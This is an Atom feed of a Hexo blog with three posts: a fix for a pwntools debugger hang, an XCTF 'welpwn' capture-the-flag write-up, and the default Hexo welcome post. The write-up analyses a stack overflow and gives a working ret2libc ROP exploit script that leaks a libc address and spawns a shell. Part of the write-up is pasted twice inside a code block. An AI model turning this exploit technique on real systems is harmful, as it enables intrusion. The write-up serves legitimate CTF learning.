<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-11-10T11:03:35.535Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>v4.6.0-gdb.attach问题</title>
    <link href="http://example.com/2021/11/10/v4-6-0-gdb-attach%E9%97%AE%E9%A2%98/"/>
    <id>http://example.com/2021/11/10/v4-6-0-gdb-attach%E9%97%AE%E9%A2%98/</id>
    <published>2021-11-10T08:40:03.000Z</published>
    <updated>2021-11-10T11:03:35.535Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwntools-Waiting-for-debugger"><a href="#pwntools-Waiting-for-debugger" class="headerlink" title="pwntools Waiting for debugger"></a>pwntools Waiting for debugger</h1><p>出现了个毛病不知道为什么我gdb.attach调试的时候为什么一直Waiting for debugger一直都在转,我那个时候是蒙着的,不知道为什么这个情况,那个时候我以为我系统有点毛病,然后换docker还是如此,再换虚拟机的还是如此。那个时候我人已经快崩了。搞不定可能当成退役.不过还是解决了.感谢师傅们的帮忙!@</p><p>我们看向问题在动态调试的时候会出现这个样子</p><p><img src="../../images/image-20211110171047150.png" alt="image-20211110171047150"></p><p>就是这个情况会出现按c运行</p><p><img src="../../images/image-20211110171121500.png" alt="image-20211110171121500"></p><p>解决方法:</p><p>在以下目录下找到proc文件,如果是Python3就把python2.7改成你Python3的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/python2.7/dist-packages/pwnlib/util/proc.py</span><br></pre></td></tr></table></figure><p>在最后321行-355行中找到以下代码就是这里出了问题，多的我不多说</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wait_for_debugger</span>(<span class="params">pid, debugger_pid=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;wait_for_debugger(pid, debugger_pid=None) -&gt; None</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Sleeps until the process with PID `pid` is being traced.</span></span><br><span class="line"><span class="string">    If debugger_pid is set and debugger exits, raises an error.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Arguments:</span></span><br><span class="line"><span class="string">        pid (int): PID of the process.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    t = Timeout()</span><br><span class="line">    <span class="keyword">with</span> t.countdown(timeout=<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">with</span> log.waitfor(<span class="string">&#x27;Waiting for debugger&#x27;</span>) <span class="keyword">as</span> l:</span><br><span class="line">            <span class="keyword">while</span> debugger_pid:</span><br><span class="line">                debugger = psutil.Process(debugger_pid)</span><br><span class="line">                <span class="keyword">while</span> t.timeout <span class="keyword">and</span> tracer(pid) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        debugger.wait(<span class="number">0.01</span>)</span><br><span class="line">                    <span class="keyword">except</span> psutil.TimeoutExpired:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        debugger_pid = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">while</span> t.timeout <span class="keyword">and</span> tracer(pid) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tracer(pid):</span><br><span class="line">            l.success()</span><br><span class="line">        <span class="keyword">elif</span> debugger_pid == <span class="number">0</span>:</span><br><span class="line">            l.failure(<span class="string">&quot;debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l.failure(<span class="string">&#x27;Debugger did not attach to pid %d within 15 seconds&#x27;</span>, pid)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把以上的代码替换成如下就成了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wait_for_debugger</span>(<span class="params">pid, debugger_pid=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;wait_for_debugger(pid, debugger_pid=None) -&gt; None</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Sleeps until the process with PID `pid` is being traced.</span></span><br><span class="line"><span class="string">    If debugger_pid is set and debugger exits, raises an error.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Arguments:</span></span><br><span class="line"><span class="string">        pid (int): PID of the process.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    t = Timeout()</span><br><span class="line">    <span class="keyword">with</span> t.countdown(timeout=<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">with</span> log.waitfor(<span class="string">&#x27;Waiting for debugger&#x27;</span>) <span class="keyword">as</span> l:</span><br><span class="line">            <span class="keyword">while</span> debugger_pid:</span><br><span class="line">                debugger = psutil.Process(debugger_pid)</span><br><span class="line">                <span class="keyword">if</span> tracer(pid) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="keyword">break</span></span><br><span class="line">                <span class="comment">#while t.timeout and tracer(pid) is None:</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    debugger.wait(<span class="number">0.01</span>)</span><br><span class="line">                <span class="keyword">except</span> psutil.TimeoutExpired:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    debugger_pid = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">while</span> t.timeout <span class="keyword">and</span> tracer(pid) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tracer(pid):</span><br><span class="line">            l.success()</span><br><span class="line">        <span class="keyword">elif</span> debugger_pid == <span class="number">0</span>:</span><br><span class="line">            l.failure(<span class="string">&quot;debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l.failure(<span class="string">&#x27;Debugger did not attach to pid %d within 15 seconds&#x27;</span>, pid)</span><br></pre></td></tr></table></figure><p>详细一点的链接</p><p><a href="https://blog.csdn.net/weixin_43483799/article/details/118885208#t4">https://blog.csdn.net/weixin_43483799/article/details/118885208#t4</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwntools-Waiting-for-debugger&quot;&gt;&lt;a href=&quot;#pwntools-Waiting-for-debugger&quot; class=&quot;headerlink&quot; title=&quot;pwntools Waiting for debugger&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="pwntools" scheme="http://example.com/tags/pwntools/"/>
    
  </entry>
  
  <entry>
    <title>xctf-welpwn</title>
    <link href="http://example.com/2021/11/10/xctf-welpwn/"/>
    <id>http://example.com/2021/11/10/xctf-welpwn/</id>
    <published>2021-11-10T07:58:43.000Z</published>
    <updated>2021-11-10T11:06:52.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-welpwn"><a href="#XCTF-welpwn" class="headerlink" title="XCTF welpwn"></a>XCTF welpwn</h1><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>我们来分析他是怎么样的步骤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Welcome to RCTF\n&quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  echo((__int64)&amp;buf);#主体是这个函数里面</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数里面(将大小为0x400的值赋值给大小为0x10的s2很明显会造成溢出.问题是buf中有含有\x00会中断循环)</p><p>注释:就是你输入的字符串存放到buf中,在echo函数中,将buf复制到s2时造成了溢出。通过循环逐字节复制,如果读取到00字节，则会中断循环</p><p>这会影响我们的rop构造,因为我们寻找的gadgat都会存在00字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">echo</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;ROIS&quot;</span>, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;RCTF&#123;Welcome&#125;&quot;</span>, s2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; is not flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后剩下的都懂他覆盖了EBP就是证明是可以溢出,然后我们正常rop发现出毛病了出不了哎,这个时候我们就要去看栈的结构</p><p>我们在他栈里设置断点然后调试一下脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line">p= process(<span class="string">&#x27;./welpwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./welpwn&#x27;</span>)</span><br><span class="line"><span class="comment">#main_addr = 0x4007CD</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x00000000004008a3</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span> +<span class="string">&quot;b&quot;</span>*<span class="number">8</span>+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x4007CD&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;RCTF\n&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span> puts_got</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行之后c执行查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>x $sp</span><br><span class="line"><span class="number">0x7ffe4bddc238</span>:<span class="number">0x62626262</span><span class="number">0x62626262</span><span class="number">0x00601018</span><span class="number">0x61616161</span></span><br><span class="line"><span class="number">0x7ffe4bddc248</span>:<span class="number">0x61616161</span><span class="number">0x61616161</span><span class="number">0x61616161</span><span class="number">0x61616161</span></span><br><span class="line"><span class="number">0x7ffe4bddc258</span>:<span class="number">0x62626262</span><span class="number">0x62626262</span><span class="number">0x00601018</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7ffe4bddc268</span>:<span class="number">0x004005a0</span><span class="number">0x00000000</span><span class="number">0x004007cd</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7ffe4bddc278</span>:<span class="number">0x510d530a</span><span class="number">0x00007f5f</span><span class="number">0xffffffff</span><span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p>我们可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">0x626262620x62626262#就是我们覆盖EBP的值</span><br><span class="line">0x006010180x00000000#他这个值就是我们puts_got的地址，然后后面跟着0x00，发现我们每次地址前后都有0x00截断XCTF welpwn</span><br><span class="line">分析</span><br><span class="line">我们来分析他是怎么样的步骤</span><br><span class="line"></span><br><span class="line">￼</span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-400h]</span><br><span class="line">​</span><br><span class="line">  write(1, &quot;Welcome to RCTF\n&quot;, 0x10uLL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(0, &amp;buf, 0x400uLL);</span><br><span class="line">  echo((__int64)&amp;buf);                  #主体是这个函数里面</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">这个函数里面(将大小为0x400的值赋值给大小为0x10的s2很明显会造成溢出.问题是buf中有含有\x00会中断循环)</span><br><span class="line"></span><br><span class="line">注释:就是你输入的字符串存放到buf中,在echo函数中,将buf复制到s2时造成了溢出。通过循环逐字节复制,如果读取到00字节，则会中断循环</span><br><span class="line"></span><br><span class="line">这会影响我们的rop构造,因为我们寻找的gadgat都会存在00字节</span><br><span class="line"></span><br><span class="line">￼</span><br><span class="line">int __fastcall echo(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s2[16]; // [rsp+10h] [rbp-10h]</span><br><span class="line">​</span><br><span class="line">  for ( i = 0; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = 0;</span><br><span class="line">  if ( !strcmp(&quot;ROIS&quot;, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;RCTF&#123;Welcome&#125;&quot;, s2);</span><br><span class="line">    puts(&quot; is not flag&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return printf(&quot;%s&quot;, s2);</span><br><span class="line">&#125;</span><br><span class="line">然后剩下的都懂他覆盖了EBP就是证明是可以溢出,然后我们正常rop发现出毛病了出不了哎,这个时候我们就要去看栈的结构</span><br><span class="line"></span><br><span class="line">我们在他栈里设置断点然后调试一下脚本如下</span><br><span class="line"></span><br><span class="line">￼</span><br><span class="line">from pwn import *</span><br><span class="line">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">#context.log_level=&quot;debug&quot;</span><br><span class="line">p= process(&#x27;./welpwn&#x27;)</span><br><span class="line">elf=ELF(&#x27;./welpwn&#x27;)</span><br><span class="line">#main_addr = 0x4007CD</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_addr=elf.symbols[&#x27;main&#x27;]</span><br><span class="line">pop_rdi_ret=0x00000000004008a3</span><br><span class="line">payload = b&quot;a&quot;*0x18 +&quot;b&quot;*8+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">gdb.attach(p,&quot;b *0x4007CD&quot;)</span><br><span class="line">p.sendlineafter(&quot;RCTF\n&quot;,payload)</span><br><span class="line">print puts_got</span><br><span class="line">p.interactive()</span><br><span class="line">运行之后c执行查看</span><br><span class="line"></span><br><span class="line">￼</span><br><span class="line">pwndbg&gt; x/20x $sp</span><br><span class="line">0x7ffe4bddc238: 0x62626262  0x62626262  0x00601018  0x61616161</span><br><span class="line">0x7ffe4bddc248: 0x61616161  0x61616161  0x61616161  0x61616161</span><br><span class="line">0x7ffe4bddc258: 0x62626262  0x62626262  0x00601018  0x00000000</span><br><span class="line">0x7ffe4bddc268: 0x004005a0  0x00000000  0x004007cd  0x00000000</span><br><span class="line">0x7ffe4bddc278: 0x510d530a  0x00007f5f  0xffffffff  0x00000000</span><br><span class="line">我们可以看到</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以猜测我们之前是溢出的字符0x10+ebp(覆盖)的值,地址是(4位一个地址)我们得到下面是我们的栈的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe4bddc248:0x616161610x616161610x616161610x61616161</span><br><span class="line">0x7ffe4bddc258:0x626262620x626262620x006010180x00000000</span><br><span class="line">0x7ffe4bddc268:0x004005a00x000000000x004007cd0x00000000</span><br></pre></td></tr></table></figure><p>这个时候有00截断就不能正常ROP了,我们可以将rop链转到buf中所以要用到四个pop和一个返回地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary welpwn --only &#x27;pop|ret&#x27; </span><br><span class="line">0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure><p>这是将’a’*10+’b’*8+pop4_ret的地址都pop,pop出来4个堆栈数据那就可以正常ROP了</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取远程进程对象</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,50317)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取本地进程对象</span></span><br><span class="line">p = process(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取文件对象</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./welpwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取lib库对象</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4007CD</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">pop4_ret = <span class="number">0x40089c</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(pop4_ret) + p64(pop_rdi_ret) + p64(write_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Welcome to RCTF\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>))</span><br><span class="line">p.recv(<span class="number">3</span>)</span><br><span class="line">write_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;write_addr =&gt; %#x&quot;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment">#0x00000000004003d7=sh</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(pop4_ret) + p64(pop_rdi_ret) + p64(<span class="number">0x00000000004003d7</span>) + p64(system_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x4007CD&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>总结:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多利用gdb动态调试查看栈中出现了什么情况</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XCTF-welpwn&quot;&gt;&lt;a href=&quot;#XCTF-welpwn&quot; class=&quot;headerlink&quot; title=&quot;XCTF welpwn&quot;&gt;&lt;/a&gt;XCTF welpwn&lt;/h1&gt;&lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="xctf-pwn" scheme="http://example.com/tags/xctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/11/08/hello-world/"/>
    <id>http://example.com/2021/11/08/hello-world/</id>
    <published>2021-11-08T04:46:57.765Z</published>
    <updated>2021-11-08T04:46:57.765Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
